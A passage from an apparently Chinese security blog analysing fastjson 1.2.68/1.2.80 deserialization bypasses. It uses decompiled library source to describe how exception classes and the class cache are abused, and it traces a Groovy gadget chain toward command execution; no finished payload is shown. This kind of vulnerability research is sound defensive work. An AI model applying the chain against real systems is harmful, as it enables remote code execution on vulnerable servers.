<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<br>	......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>		......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">currency</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currency&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (currency != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(currency);<br>                        &#125;<br><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">symbol</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currencyCode&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (symbol != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(symbol);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Map.Entry.class) &#123;<br>                        <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> jsonObject.toJavaObject(clazz);<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br>        ......<br></code></pre></td></tr></table></figure>

<p>JSONObject#toJavaObject()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">toJavaObject</span><span class="hljs-params">(Type type)</span> &#123;<br>    <span class="hljs-keyword">return</span> TypeUtils.cast(<span class="hljs-built_in">this</span>, type, ParserConfig.getGlobalInstance());<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TypeUtils#cast()</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">cast</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj, Type <span class="hljs-keyword">type</span>, ParserConfig mapping</span>) &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Class</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">Class</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ParameterizedType</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">ParameterizedType</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>) &#123;<br>            <span class="hljs-title class_">String</span> strVal = (<span class="hljs-title class_">String</span>)obj;<br>            <span class="hljs-keyword">if</span> (strVal.<span class="hljs-title function_">length</span>() == <span class="hljs-number">0</span> || <span class="hljs-string">&quot;null&quot;</span>.<span class="hljs-title function_">equals</span>(strVal) || <span class="hljs-string">&quot;NULL&quot;</span>.<span class="hljs-title function_">equals</span>(strVal)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">TypeVariable</span>) &#123;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span>Exception(<span class="hljs-string">&quot;can not cast to : &quot;</span> + <span class="hljs-keyword">type</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TypeUtils#catToJavaBen()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">castToJavaBean</span><span class="hljs-params">(Map&lt;String, Object&gt; map, Class&lt;T&gt; clazz, ParserConfig config)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String className;<br>        String language;<br>        <span class="hljs-keyword">if</span> (clazz == StackTraceElement.class) &#123;<br>		......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> map.get(JSON.DEFAULT_TYPE_KEY);<span class="hljs-comment">//获取@type,故格式需为&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;xxxx.xxxxx&quot;</span><br>            <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                className = (String)arg0;<br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.global;<br>                &#125;<br><br>                Class&lt;?&gt; loadClazz = config.checkAutoType(className, (Class)<span class="hljs-literal">null</span>);<br>                <span class="hljs-keyword">if</span> (loadClazz == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(className + <span class="hljs-string">&quot; not found&quot;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (!loadClazz.equals(clazz)) &#123;<br>                    <span class="hljs-keyword">return</span> castToJavaBean(map, loadClazz, config);<br>                &#125;<br>            &#125;<br><br>            JSONObject jsonObject;<br>            ObjectDeserializer deserializer;<br>            <span class="hljs-keyword">if</span> (clazz.isInterface()) &#123;<br>                <span class="hljs-keyword">if</span> (map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    jsonObject = (JSONObject)map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.getGlobalInstance();<br>                &#125;<br><br>                deserializer = config.get(clazz);<br>                <span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>                    language = JSON.toJSONString(jsonObject);<br>                    <span class="hljs-keyword">return</span> JSON.parseObject(language, clazz);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, jsonObject);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                    arg0 = map.get(<span class="hljs-string">&quot;language&quot;</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">arg1</span> <span class="hljs-operator">=</span> map.get(<span class="hljs-string">&quot;country&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                        language = (String)arg0;<br>                        <span class="hljs-keyword">if</span> (arg1 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">country</span> <span class="hljs-operator">=</span> (String)arg1;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language, country);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (arg1 == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == String.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map.toString();<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSON.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz == LinkedHashMap.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                        jsonObject = (JSONObject)map;<br>                        Map&lt;String, Object&gt; innerMap = jsonObject.getInnerMap();<br>                        <span class="hljs-keyword">if</span> (innerMap <span class="hljs-keyword">instanceof</span> LinkedHashMap) &#123;<br>                            <span class="hljs-keyword">return</span> innerMap;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz.isInstance(map)) &#123;<br>                        <span class="hljs-keyword">return</span> map;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONObject.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                            config = ParserConfig.getGlobalInstance();<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanDeserializer</span> <span class="hljs-variable">javaBeanDeser</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        deserializer = config.getDeserializer(clazz);<br>                        <span class="hljs-keyword">if</span> (deserializer <span class="hljs-keyword">instanceof</span> JavaBeanDeserializer) &#123;<br>                            javaBeanDeser = (JavaBeanDeserializer)deserializer;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (javaBeanDeser == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;can not get javaBeanDeserializer. &quot;</span> + clazz.getName());<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">return</span> javaBeanDeser.createInstance(map, config);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(var8.getMessage(), var8);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>利用流程：</p>
<ol>
<li><p>指定显式期望类，实例化XXXException并被加入类缓存</p>
</li>
<li><p>通过XXXException中可控的属性名&#x2F;参数名，由隐式类间关系实例化并被加入类缓存</p>
</li>
<li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p>
</li>
</ol>
<h4 id="PAYLOAD-10"><a href="#PAYLOAD-10" class="headerlink" title="PAYLOAD:"></a>PAYLOAD:</h4><p>1.2.68及1.2.80版本均需要相应依赖库方可造成危害，漏洞危害大大减少，payload根据浅蓝师傅分享payload进行分析</p>
<h6 id="Gadget-groovy命令执行"><a href="#Gadget-groovy命令执行" class="headerlink" title="Gadget:groovy命令执行"></a>Gadget:groovy命令执行</h6><p>依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>利用链分析：</p>
<p>org.codehaus.groovy.control.CompilationFailedException类继承Exction可通过校验，构造方法int phase, ProcessingUnit unit, Throwable cause三个参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">CompilationFailedException</span><span class="hljs-params">(<span class="hljs-type">int</span> phase, ProcessingUnit unit, Throwable cause)</span> &#123;<br>    <span class="hljs-built_in">super</span>(Phases.getDescription(phase) + <span class="hljs-string">&quot; failed&quot;</span>, cause);<br>    <span class="hljs-built_in">this</span>.phase = phase;<br>    <span class="hljs-built_in">this</span>.unit = unit;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.control.ProcessingUnit类，setClassLoader()方法调用new GroovyClassLoader(parent, this.getConfiguration())</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessingUnit</span><span class="hljs-params">(CompilerConfiguration configuration, GroovyClassLoader classLoader, ErrorCollector errorCollector)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration != <span class="hljs-literal">null</span> ? configuration : CompilerConfiguration.DEFAULT);<br>    <span class="hljs-built_in">this</span>.setClassLoader(classLoader);<br>    <span class="hljs-built_in">this</span>.errorCollector = errorCollector != <span class="hljs-literal">null</span> ? errorCollector : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorCollector</span>(<span class="hljs-built_in">this</span>.getConfiguration());<br>    <span class="hljs-built_in">this</span>.configure(<span class="hljs-built_in">this</span>.getConfiguration());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> CompilerConfiguration <span class="hljs-title function_">getConfiguration</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.configuration;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConfiguration</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.configuration = (CompilerConfiguration)Objects.requireNonNull(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> GroovyClassLoader <span class="hljs-title function_">getClassLoader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.classLoader;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassLoader</span><span class="hljs-params">(GroovyClassLoader loader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.classLoader = loader != <span class="hljs-literal">null</span> ? loader : (GroovyClassLoader)AccessController.doPrivileged(() -&gt; &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-keyword">if</span> (parent == <span class="hljs-literal">null</span>) &#123;<br>            parent = ProcessingUnit.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyClassLoader</span>(parent, <span class="hljs-built_in">this</span>.getConfiguration());<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>GroovyClassLoader构造方法中 this.addClasspath(path);</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">GroovyClassLoader</span><span class="hljs-params">(ClassLoader parent, CompilerConfiguration config, <span class="hljs-type">boolean</span> useConfigurationClasspath)</span> &#123;<br>    <span class="hljs-built_in">super</span>(EMPTY_URL_ARRAY, parent);<br>    <span class="hljs-built_in">this</span>.classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnlimitedConcurrentCache</span>();<br>    <span class="hljs-built_in">this</span>.sourceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedCommonCache</span>();<br>    <span class="hljs-built_in">this</span>.resourceLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyResourceLoader</span>() &#123;<br>        <span class="hljs-keyword">public</span> URL <span class="hljs-title function_">loadGroovySource</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>            <span class="hljs-keyword">return</span> (URL)AccessController.doPrivileged(() -&gt; &#123;<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.config.getScriptExtensions().iterator();<br><br>                <span class="hljs-keyword">while</span>(var2.hasNext()) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> (String)var2.next();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">URL</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.getSourceFile(filename, extension);<br>                        <span class="hljs-keyword">if</span> (ret != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> ret;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>        config = CompilerConfiguration.DEFAULT;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-keyword">if</span> (useConfigurationClasspath) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> config.getClasspath().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> (String)var4.next();<br>            <span class="hljs-built_in">this</span>.addClasspath(path);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.initSourceEncoding(config);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>JavaStubCompilationUnit继承ProcessingUnit类，构造方法如下中调用addPhaseOperation()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">JavaStubCompilationUnit</span><span class="hljs-params">(CompilerConfiguration config, GroovyClassLoader gcl, File destDir)</span> &#123;<br>    <span class="hljs-built_in">super</span>(config, (CodeSource)<span class="hljs-literal">null</span>, gcl);<br>    <span class="hljs-keyword">if</span> (destDir == <span class="hljs-literal">null</span>) &#123;<br>        Map&lt;String, Object&gt; options = <span class="hljs-built_in">this</span>.configuration.getJointCompilationOptions();<br>        destDir = (File)options.get(<span class="hljs-string">&quot;stubDir&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">useJava5</span> <span class="hljs-operator">=</span> CompilerConfiguration.isPostJDK5(<span class="hljs-built_in">this</span>.configuration.getTargetBytecode());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configuration.getSourceEncoding();<br>    <span class="hljs-built_in">this</span>.stubGenerator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaStubGenerator</span>(destDir, <span class="hljs-literal">false</span>, useJava5, encoding);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">VariableScopeVisitor</span>(source)).visitClass(classNode);<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaAwareResolveVisitor</span>(<span class="hljs-built_in">this</span>)).startResolving(classNode, source);<br>    &#125;, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.stubGenerator.generateClass(classNode);<br>            ++<span class="hljs-built_in">this</span>.stubCount;<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException var5) &#123;<br>            source.addException(var5);<br>        &#125;<br><br>    &#125;,<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.control.CompilationUnit#addPhaseOperation()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(ISourceUnitOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(IPrimaryClassNodeOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperations()</p>
